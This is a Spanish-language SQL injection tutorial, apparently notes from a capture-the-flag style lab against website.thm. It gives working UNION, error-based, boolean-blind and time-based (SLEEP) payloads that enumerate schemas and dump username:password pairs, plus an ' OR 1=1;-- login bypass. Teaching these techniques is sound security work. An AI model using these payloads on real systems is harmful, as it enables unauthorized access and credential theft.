# SQLinyection

SQL (lenguaje de consulta estructurado) es un lenguaje rico en funciones que se utiliza para consultar bases de datos; estas consultas SQL se conocen mejor como declaraciones.

El más simple de los comandos que cubriremos en esta tarea se usa para recuperar (seleccionar), actualizar, insertar y eliminar datos. Aunque algo similar, algunos servidores de bases de datos tienen su propia sintaxis y pequeños cambios en el funcionamiento de las cosas. Todos estos ejemplos se basan en una base de datos MySQL. Después de aprender las lecciones, podrá buscar fácilmente una sintaxis alternativa en línea para los diferentes servidores. Vale la pena señalar que la sintaxis SQL no distingue entre mayúsculas y minúsculas.

### In-Band SQL Injection
In-Band SQL Injection es el tipo más fácil de detectar y explotar; En banda simplemente se refiere al mismo método de comunicación que se usa para explotar la vulnerabilidad y también recibir los resultados, por ejemplo, descubrir una vulnerabilidad de inyección SQL en una página de sitio web y luego poder extraer datos de la base de datos a la misma página.

### Error-Based SQL Injection
Este tipo de inyección SQL es el más útil para obtener fácilmente información sobre la estructura de la base de datos, ya que los mensajes de error de la base de datos se imprimen directamente en la pantalla del navegador. Esto a menudo se puede usar para enumerar una base de datos completa. 

### Union-Based SQL Injection

Este tipo de inyección utiliza el operador SQL UNION junto con una declaración SELECT para devolver resultados adicionales a la página. Este método es la forma más común de extraer grandes cantidades de datos a través de una vulnerabilidad de inyección SQL.

La clave para descubrir la inyección SQL basada en errores es romper la consulta SQL del código probando ciertos caracteres hasta que se produzca un mensaje de error; estos son más comúnmente apóstrofes simples ( ' ) o una comilla ( " ).

### In-Band SQL Injection
![image](https://user-images.githubusercontent.com/69023634/152703694-18042e80-7f8b-4e96-9c37-38571cebddf0.png)

Como vemos e ha generado un error al agregar la comilla simple, ahora lo que debemos hacer es devolver los datos al navegador sin mostrar un mensaje de error. En primer lugar, probaremos el operador UNION para que podamos recibir un resultado adicional de nuestra elección.
```
1 UNION SELECT 1
```
![image](https://user-images.githubusercontent.com/69023634/152703792-f3b39a3b-3d60-418f-a98d-237178e9addb.png)

Esta declaración debería generar un mensaje de error informándole que la declaración UNION SELECT tiene un número diferente de columnas que la consulta SELECT original. Así que intentemos de nuevo pero agreguemos columnas hasta que el error desaparezca.
```
1 UNION SELECT 1,2,3
```
![image](https://user-images.githubusercontent.com/69023634/152703823-dbed6d98-3a16-4751-b16d-af0123cfd586.png)

Éxito, el mensaje de error desapareció y el artículo se muestra, pero ahora queremos mostrar nuestros datos en lugar del artículo. El artículo se muestra porque toma el primer resultado devuelto en alguna parte del código del sitio web y lo muestra. Para evitar eso, necesitamos que la primera consulta no produzca resultados. Esto se puede hacer simplemente cambiando la identificación del artículo de 1 a 0.
```
0 UNION SELECT 1,2,3
```
Ahora verá que el artículo está formado por el resultado de la selección UNION que devuelve los valores de columna 1, 2 y 3. Podemos comenzar a usar estos valores devueltos para recuperar información más útil. Primero, obtendremos el nombre de la base de datos a la que tenemos acceso:
```
0 UNION SELECT 1,2,database()
```
![image](https://user-images.githubusercontent.com/69023634/152703950-051de64b-406a-4fa0-8ee0-34c5a42338ee.png)

Ahora verá dónde se mostraba anteriormente el número 3 el nombre de la base de datos, que es  sqli_one .
Nuestra siguiente consulta reunirá una lista de tablas que se encuentran en esta base de datos.
```
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```
![image](https://user-images.githubusercontent.com/69023634/152704186-34cc8d0a-1472-44e0-9379-f40686a4fb46.png)

Hay un par de cosas nuevas que aprender en esta consulta. En primer lugar, el método  group_concat()  obtiene la columna especificada (en nuestro caso, table_name) de varias filas devueltas y la coloca en una cadena separada por comas. Lo siguiente es la  base de datos information_schema  ; todos los usuarios de la base de datos tienen acceso a esto y contiene información sobre todas las bases de datos y tablas a las que el usuario tiene acceso. En esta consulta en particular, estamos interesados en listar todas las tablas en la  base de datos sqli_one  , que es article y staff_users. 

Como el primer nivel tiene como objetivo descubrir la contraseña de Martin, la tabla staff_users es lo que nos interesa. Podemos utilizar la base de datos information_schema nuevamente para encontrar la estructura de esta tabla usando la siguiente consulta.

```
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```
Esto es similar a la consulta SQL anterior. Sin embargo, la información que queremos recuperar ha cambiado de table_name a  column_name , la tabla que estamos consultando en la base de datos information_schema ha cambiado de tablas a  columnas , y estamos buscando cualquier fila donde la  columna table_name  tenga un valor de  staff_users .

Los resultados de la consulta proporcionan tres columnas para la tabla staff_users: id, contraseña y nombre de usuario. Podemos usar las columnas de nombre de usuario y contraseña para nuestra siguiente consulta para recuperar la información del usuario.
```
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```
Nuevamente, usamos el método group_concat para devolver todas las filas en una sola cadena y para que sea más fácil de leer. También hemos agregado  ':'  para separar el nombre de usuario y la contraseña. En lugar de estar separados por una coma, hemos elegido la etiqueta HTML  <br>  que obliga a que cada resultado esté en una línea separada para facilitar la lectura.

![image](https://user-images.githubusercontent.com/69023634/152704719-235f3d45-bb49-4ace-8bb2-72d1651c8952.png)


### In-Band SQL Injection Commands
**Generar error**
```
https://website.thm/article?id=1'
```

**Evitando el error**
```
1 UNION SELECT 1,2,3
```

**Explotando el error**
```
0 UNION SELECT 1,2,database()
```

**Extrayendo tablas de DB**
```
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

**Extrayendo columns de DB**
```
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

**Extrayendo datos de Columns**
```
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

### Blind SQLi - Authentication Bypass
Blind SQLi
A diferencia de la inyección de SQL en banda, donde podemos ver los resultados de nuestro ataque directamente en la pantalla, SQLi ciego es cuando recibimos poca o ninguna respuesta para confirmar si nuestras consultas inyectadas fueron, de hecho, exitosas o no, esto se debe a que el los mensajes de error se han deshabilitado, pero la inyección aún funciona a pesar de todo. Puede que le sorprenda que todo lo que necesitamos es un poco de retroalimentación para enumerar con éxito una base de datos completa.

Authentication Bypass
Una de las técnicas de inyección ciega de SQL más sencillas es cuando se eluden los métodos de autenticación, como los formularios de inicio de sesión. En este caso, no estamos tan interesados en recuperar datos de la base de datos; Solo queremos pasar el inicio de sesión. 

Los formularios de inicio de sesión que están conectados a una base de datos de usuarios a menudo se desarrollan de tal manera que la aplicación web no está interesada en el contenido del nombre de usuario y la contraseña, sino más bien en si los dos forman un par coincidente en la tabla de usuarios. En términos básicos, la aplicación web le pregunta a la base de datos "¿tiene un usuario con el nombre de usuario  bob  y la contraseña  bob123 ?", y la base de datos responde con sí o no (verdadero/falso) y, dependiendo de esa respuesta, dicta si la aplicación web le permite continuar o no. 

Teniendo en cuenta la información anterior, no es necesario enumerar un par de nombre de usuario/contraseña válido. Solo necesitamos crear una consulta de base de datos que responda con un sí/verdadero.

Por ejemplo podemos imaginarla estrcutura de una sentencia sql que se ejecuta en el formulario es así;
```
select * from users where username='%username%' and password='%password%' LIMIT 1;

```
Podriamos omitir este inicio inidicando la siguiente sentencia.
```
' OR 1=1;--
```
Lo que convierte la consulta SQL en lo siguiente:
```
select * from users where username='' and password='' OR 1=1;
```
Debido a que 1=1 es una declaración verdadera y hemos usado un  operador OR  , esto siempre hará que la consulta regrese como verdadera, lo que satisface la lógica de las aplicaciones web de que la base de datos encontró una combinación válida de nombre de usuario/contraseña y que se debe permitir el acceso .


### Blind SQLi - Boolean Based

La inyección SQL basada en booleanos se refiere a la respuesta que recibimos de nuestros intentos de inyección, que podría ser verdadero/falso, sí/no, activado/desactivado, 1/0 o cualquier respuesta que solo pueda tener dos resultados. Ese resultado nos confirma que nuestra carga útil de SQL Injection fue exitosa o no. En la primera inspección, puede sentir que esta respuesta limitada no puede proporcionar mucha información. Aún así, de hecho, con solo estas dos respuestas, es posible enumerar la estructura y el contenido de una base de datos completa.

Al igual que anteriormente nuestra primera tareas es encontrar el error sql, luego procedemos a evitar el error encontrando el numero de columnas. 
```
admin123' UNION SELECT 1,2,3;-- 
```
Ahora que se ha establecido nuestro número de columnas, podemos trabajar en la enumeración de la base de datos. Nuestra primera tarea es descubrir el nombre de la base de datos. Podemos hacer esto usando el método integrado de la base de  datos()  y luego usando el  operador like  para tratar de encontrar resultados que devuelvan un estado verdadero.

Pruebe el siguiente valor de nombre de usuario y vea qué sucede:
```
admin123' UNION SELECT 1,2,3 where database() like '%';--
```

Obtenemos una respuesta verdadera porque, en el operador like, solo tenemos el valor de  % , que coincidirá con cualquier cosa, ya que es el valor comodín. Si cambiamos el operador comodín a  a% , verá que la respuesta vuelve a ser falsa, lo que confirma que el nombre de la base de datos no comienza con la letra  a . Podemos recorrer todas las letras, números y caracteres como - y _ hasta que descubramos una coincidencia. Si envía lo siguiente como valor de nombre de usuario, recibirá una  respuesta verdadera  que confirma que el nombre de la base de datos comienza con la letra  s .
```
admin123' UNION SELECT 1,2,3 where database() like 's%';--
```
Ahora pasa al siguiente carácter del nombre de la base de datos hasta que encuentre otra  respuesta verdadera  , por ejemplo, 'sa%', 'sb%', 'sc%', etc. Continúe con este proceso hasta que descubra todos los caracteres del nombre de la base de datos, que es  sqli_tres .

Hemos establecido el nombre de la base de datos, que ahora podemos usar para enumerar los nombres de las tablas usando un método similar utilizando la base de datos information_schema. Intente configurar el nombre de usuario en el siguiente valor:

```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```
Esta consulta busca resultados en la  base de datos information_schema  en la  tabla de tablas  donde el nombre de la base de datos coincide con  sqli_tres y el nombre de la tabla comienza con la letra a. Como la consulta anterior da como resultado una  respuesta falsa  , podemos confirmar que no hay tablas en la base de datos sqli_tres que comiencen con la letra a. Al igual que antes, deberá recorrer letras, números y caracteres hasta que encuentre una coincidencia positiva.

Finalmente, terminará descubriendo una tabla en la base de datos sqli_tres con el nombre de usuarios, que puede confirmar ejecutando la siguiente carga de nombre de usuario:

```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
```

Por último, ahora necesitamos enumerar los nombres de las columnas en la  tabla de usuarios  para que podamos buscar correctamente las credenciales de inicio de sesión. Nuevamente, usando la base de datos information_schema y la información que ya obtuvimos, podemos comenzar a consultar los nombres de las columnas. Usando la carga útil a continuación, buscamos en la  tabla de columnas  donde la base de datos es igual a sqli_tres, el nombre de la tabla es usuarios y el nombre de la columna comienza con la letra a.
```
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```
Una vez más, deberá recorrer las letras, los números y los caracteres hasta que encuentre una coincidencia. Como está buscando múltiples resultados, tendrá que agregar esto a su carga útil cada vez que encuentre un nuevo nombre de columna, para que no siga descubriendo el mismo. Por ejemplo, una vez que haya encontrado la columna llamada  id , la agregará a su carga útil original (como se ve a continuación).

```
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
```

Repetir este proceso tres veces le permitirá descubrir las columnas id, nombre de usuario y contraseña. Que ahora puede usar para consultar la  tabla de usuarios  para las credenciales de inicio de sesión. Primero, deberá descubrir un nombre de usuario válido que pueda usar en la carga útil a continuación:
```
admin123' UNION SELECT 1,2,3 from users where username like 'a%
```

Lo cual, una vez que haya recorrido todos los caracteres, confirmará la existencia del nombre de usuario  admin . Ahora tienes el nombre de usuario. Puede concentrarse en descubrir la contraseña. La siguiente carga útil le muestra cómo encontrar la contraseña:

```
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```
Recorriendo todos los caracteres, descubrirá que la contraseña es 3845.


### Blind SQLi - Time Based
Una inyección de SQL ciega basada en el tiempo es muy similar a la anterior basada en booleanos, en el sentido de que se envían las mismas solicitudes, pero no hay un indicador visual de que sus consultas sean correctas o incorrectas esta vez. En cambio, su indicador de una consulta correcta se basa en el tiempo que tarda en completarse la consulta. Este retraso de tiempo se introduce mediante el uso de métodos integrados como  SLEEP(x)  junto con la instrucción UNION. El método SLEEP() solo se ejecutará con una declaración UNION SELECT exitosa. 

Entonces, por ejemplo, al intentar establecer el número de columnas en una tabla, usaría la siguiente consulta.
```
admin123' UNION SELECT SLEEP(5);--
```
Si no hubo pausa en el tiempo de respuesta, sabemos que la consulta no tuvo éxito, por lo que, como en las tareas anteriores, agregamos otra columna:
```
admin123' UNION SELECT SLEEP(5),2;--
```
Esta carga útil debería haber producido un retraso de 5 segundos, lo que confirma la ejecución exitosa de la declaración UNION y que hay dos columnas.
Ahora puede repetir el proceso de enumeración desde la inyección de SQL basada en booleanos, agregando el   método  SLEEP() en la instrucción UNION SELECT.

Si tiene dificultades para encontrar el nombre de la tabla, la siguiente consulta debería ayudarlo en su camino:
```
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';
```

### Out-of-Band SQLi
La inyección de SQL fuera de banda no es tan común, ya que depende de funciones específicas habilitadas en el servidor de la base de datos o de la lógica empresarial de la aplicación web, que realiza algún tipo de llamada de red externa basada en los resultados de una consulta SQL.

Un ataque fuera de banda se clasifica por tener dos canales de comunicación diferentes, uno para lanzar el ataque y otro para recopilar los resultados. Por ejemplo, el canal de ataque podría ser una solicitud web y el canal de recopilación de datos podría estar monitoreando las solicitudes HTTP/DNS realizadas a un servicio que usted controla.

1) Un atacante realiza una solicitud a un sitio web vulnerable a SQL Injection con una carga útil de inyección.

2) El sitio web realiza una consulta SQL a la base de datos que también transmite la carga útil del hacker.

3) La carga útil contiene una solicitud que fuerza una solicitud HTTP de regreso a la máquina del pirata informático que contiene datos de la base de datos.

![image](https://user-images.githubusercontent.com/69023634/152707792-f1129d17-b685-4c65-85bb-b248f7929483.png)

